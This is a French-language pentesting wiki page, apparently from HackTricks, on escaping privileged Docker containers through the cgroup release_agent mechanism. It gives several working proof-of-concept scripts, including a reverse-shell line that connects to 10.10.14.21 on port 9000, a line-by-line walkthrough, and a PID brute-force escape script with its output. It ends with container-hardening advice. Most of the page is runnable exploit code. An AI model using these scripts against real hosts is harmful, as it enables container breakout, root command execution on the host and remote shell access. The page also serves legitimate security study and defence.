# `--privileged` flag

{% code title="PoC initial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash
 
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Deuxième PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

Le drapeau `--privileged` introduit des problèmes de sécurité importants et l'exploit repose sur le lancement d'un conteneur Docker avec ce drapeau activé. Lorsque ce drapeau est utilisé, les conteneurs ont un accès complet à tous les périphériques et ne sont pas soumis aux restrictions de seccomp, AppArmor et des capacités Linux.

En réalité, `--privileged` accorde beaucoup plus de permissions que nécessaire pour s'échapper d'un conteneur Docker via cette méthode. En réalité, les seuls prérequis sont :

1. Nous devons être en train d'exécuter en tant que root à l'intérieur du conteneur
2. Le conteneur doit être exécuté avec la capacité Linux `SYS_ADMIN`
3. Le conteneur doit manquer d'un profil AppArmor, ou autrement autoriser l'appel système `mount`
4. Le système de fichiers virtuel cgroup v1 doit être monté en lecture-écriture à l'intérieur du conteneur

La capacité `SYS_ADMIN` permet à un conteneur d'exécuter l'appel système `mount` \(voir [man 7 capabilities](https://linux.die.net/man/7/capabilities)\). [Docker démarre les conteneurs avec un ensemble restreint de capacités](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) par défaut et n'active pas la capacité `SYS_ADMIN` en raison des risques de sécurité que cela implique.

De plus, Docker [démarre les conteneurs avec la politique AppArmor par défaut](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) `docker-default`, qui [empêche l'utilisation de l'appel système `mount`](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) même lorsque le conteneur est exécuté avec `SYS_ADMIN`.

Un conteneur serait vulnérable à cette technique s'il est exécuté avec les drapeaux : `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Analyse du proof of concept

Maintenant que nous comprenons les prérequis pour utiliser cette technique et que nous avons affiné l'exploit de proof of concept, parcourons-le ligne par ligne pour démontrer comment il fonctionne.

Pour déclencher cette exploitation, nous avons besoin d'un cgroup où nous pouvons créer un fichier `release_agent` et déclencher l'invocation de `release_agent` en tuant tous les processus dans le cgroup. Le moyen le plus simple d'y parvenir est de monter un contrôleur cgroup et de créer un cgroup enfant.

Pour ce faire, nous créons un répertoire `/tmp/cgrp`, montons le contrôleur cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) et créons un cgroup enfant \(nommé "x" à des fins d'exemple\). Bien que tous les contrôleurs cgroup n'aient pas été testés, cette technique devrait fonctionner avec la majorité des contrôleurs cgroup.

Si vous suivez et obtenez "mount: /tmp/cgrp: special device cgroup does not exist", c'est parce que votre configuration n'a pas le contrôleur cgroup RDMA. Changez `rdma` en `memory` pour le corriger. Nous utilisons RDMA car le PoC original a été conçu pour fonctionner uniquement avec celui-ci.

Notez que les contrôleurs cgroup sont des ressources globales qui peuvent être montées plusieurs fois avec des autorisations différentes et les modifications apportées à un montage s'appliqueront à un autre.

Nous pouvons voir ci-dessous la création du cgroup enfant "x" et sa liste de répertoires.
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
Ensuite, nous activons les notifications cgroup lors de la libération du cgroup "x" en écrivant un 1 dans son fichier `notify_on_release`. Nous définissons également l'agent de libération du cgroup RDMA pour exécuter un script `/cmd` - que nous créerons plus tard dans le conteneur - en écrivant le chemin du script `/cmd` sur l'hôte dans le fichier `release_agent`. Pour cela, nous récupérons le chemin du conteneur sur l'hôte à partir du fichier `/etc/mtab`.

Les fichiers que nous ajoutons ou modifions dans le conteneur sont présents sur l'hôte, et il est possible de les modifier à partir des deux mondes : le chemin dans le conteneur et leur chemin sur l'hôte.

Ces opérations peuvent être vues ci-dessous :
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Notez le chemin d'accès au script `/cmd`, que nous allons créer sur l'hôte :
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Maintenant, nous créons le script `/cmd` de sorte qu'il exécute la commande `ps aux` et enregistre sa sortie dans `/output` sur le conteneur en spécifiant le chemin complet du fichier de sortie sur l'hôte. À la fin, nous imprimons également le contenu du script `/cmd` pour voir son contenu :
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Enfin, nous pouvons exécuter l'attaque en créant un processus qui se termine immédiatement à l'intérieur du sous-cgroupe "x". En créant un processus `/bin/sh` et en écrivant son PID dans le fichier `cgroup.procs` dans le répertoire du sous-cgroupe "x", le script sur l'hôte s'exécutera après la sortie de `/bin/sh`. La sortie de `ps aux` effectuée sur l'hôte est ensuite enregistrée dans le fichier `/output` à l'intérieur du conteneur :
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# Drapeau `--privileged` v2

Les PoCs précédents fonctionnent bien lorsque le conteneur est configuré avec un pilote de stockage qui expose le chemin d'accès complet de l'hôte du point de montage, par exemple `overlayfs`. Cependant, j'ai récemment rencontré quelques configurations qui ne divulguent pas clairement le point de montage du système de fichiers hôte.

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
Par défaut, [Kata Containers](https://katacontainers.io/) monte le système de fichiers racine d'un conteneur sur `9pfs`. Cela ne divulgue aucune information sur l'emplacement du système de fichiers du conteneur dans la machine virtuelle Kata Containers.

\* Plus d'informations sur Kata Containers dans un prochain article de blog.

## Device Mapper
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
J'ai vu un conteneur avec ce montage racine dans un environnement en direct, je crois que le conteneur fonctionnait avec une configuration de pilote de stockage `devicemapper` spécifique, mais à ce stade, je n'ai pas été en mesure de reproduire ce comportement dans un environnement de test.

## Une alternative PoC

Évidemment, dans ces cas, il n'y a pas suffisamment d'informations pour identifier le chemin des fichiers de conteneur sur le système de fichiers hôte, donc le PoC de Felix ne peut pas être utilisé tel quel. Cependant, nous pouvons toujours exécuter cette attaque avec un peu d'ingéniosité.

La seule information clé requise est le chemin complet, relatif à l'hôte du conteneur, d'un fichier à exécuter dans le conteneur. Sans pouvoir le discerner à partir des points de montage dans le conteneur, nous devons chercher ailleurs.

### Proc à la rescousse <a id="proc-to-the-rescue"></a>

Le pseudo-système de fichiers `/proc` de Linux expose les structures de données de processus du noyau pour tous les processus en cours d'exécution sur un système, y compris ceux s'exécutant dans différents espaces de noms, par exemple dans un conteneur. Cela peut être démontré en exécutant une commande dans un conteneur et en accédant au répertoire `/proc` du processus sur l'hôte : Conteneur
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
En passant, la structure de données `/proc/<pid>/root` m'a longtemps laissé perplexe, je ne comprenais pas pourquoi avoir un lien symbolique vers `/` était utile, jusqu'à ce que je lise la définition réelle dans les pages de manuel :

> /proc/\[pid\]/root
>
> UNIX et Linux supportent l'idée d'une racine de système de fichiers par processus, définie par l'appel système chroot\(2\). Ce fichier est un lien symbolique qui pointe vers le répertoire racine du processus, et se comporte de la même manière que exe et fd/\*.
>
> Notez cependant que ce fichier n'est pas simplement un lien symbolique. Il fournit la même vue du système de fichiers (y compris les espaces de noms et l'ensemble des montages par processus) que le processus lui-même.

Le lien symbolique `/proc/<pid>/root` peut être utilisé comme un chemin relatif à l'hôte vers n'importe quel fichier dans un conteneur : Conteneur
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
Cela change la condition requise pour l'attaque, passant de la connaissance du chemin complet, relatif à l'hôte du conteneur, d'un fichier à l'intérieur du conteneur, à la connaissance de l'ID de processus de _n'importe quel_ processus s'exécutant dans le conteneur.

### Bashage de PID <a id="pid-bashing"></a>

C'est en fait la partie facile, les IDs de processus dans Linux sont numériques et attribués séquentiellement. Le processus `init` est attribué l'ID de processus `1` et tous les processus suivants sont attribués des IDs incrémentiels. Pour identifier l'ID de processus de l'hôte d'un processus à l'intérieur d'un conteneur, une recherche incrémentielle par force brute peut être utilisée :Container
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
Hôte
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### Mettre le tout ensemble <a id="putting-it-all-together"></a>

Pour mener à bien cette attaque, la technique de force brute peut être utilisée pour deviner le pid pour le chemin `/proc/<pid>/root/payload.sh`, avec chaque itération écrivant le chemin pid deviné dans le fichier `release_agent` des cgroups, déclenchant le `release_agent`, et vérifiant si un fichier de sortie est créé.

Le seul inconvénient de cette technique est qu'elle n'est en aucun cas subtile et peut augmenter considérablement le nombre de pid. Comme aucun processus de longue durée n'est maintenu en cours d'exécution, cela ne devrait pas causer de problèmes de fiabilité, mais ne me citez pas là-dessus.

Le PoC ci-dessous met en œuvre ces techniques pour fournir une attaque plus générique que celle présentée initialement dans le PoC original de Felix pour s'échapper d'un conteneur privilégié en utilisant la fonctionnalité `release_agent` des cgroups :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
L'exécution du PoC dans un conteneur privilégié devrait fournir une sortie similaire à:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Utiliser les conteneurs de manière sécurisée

Docker restreint et limite les conteneurs par défaut. Assouplir ces restrictions peut créer des problèmes de sécurité, même sans le plein pouvoir du drapeau `--privileged`. Il est important de reconnaître l'impact de chaque permission supplémentaire et de limiter les permissions globales au minimum nécessaire.

Pour aider à maintenir la sécurité des conteneurs :

* Ne pas utiliser le drapeau `--privileged` ou monter un [socket Docker à l'intérieur du conteneur](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). Le socket Docker permet de créer des conteneurs, il est donc facile de prendre le contrôle total de l'hôte, par exemple, en exécutant un autre conteneur avec le drapeau `--privileged`.
* Ne pas exécuter en tant que root à l'intérieur du conteneur. Utiliser un [utilisateur différent](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) ou [des espaces de noms utilisateur](https://docs.docker.com/engine/security/userns-remap/). Le root dans le conteneur est le même que sur l'hôte sauf s'il est remappé avec des espaces de noms utilisateur. Il est seulement légèrement restreint par, principalement, les espaces de noms Linux, les capacités et les cgroups.
* [Supprimer toutes les capacités](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) et n'activer que celles qui sont nécessaires (`--cap-add=...`). Beaucoup de charges de travail n'ont besoin d'aucune capacité et leur ajout augmente la portée d'une attaque potentielle.
* [Utiliser l'option de sécurité "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) pour empêcher les processus de gagner plus de privilèges, par exemple via des binaires suid.
* [Limiter les ressources disponibles pour le conteneur](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Les limites de ressources peuvent protéger la machine contre les attaques de déni de service.
* Ajuster les profils [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (ou SELinux) pour restreindre les actions et les appels système disponibles pour le conteneur au minimum requis.
* Utiliser des [images Docker officielles](https://docs.docker.com/docker-hub/official_images/) ou construire les vôtres en vous basant sur elles. Ne pas hériter ou utiliser des images [compromises](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
* Reconstruire régulièrement vos images pour appliquer les correctifs de sécurité. Cela va de soi.

# Références

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
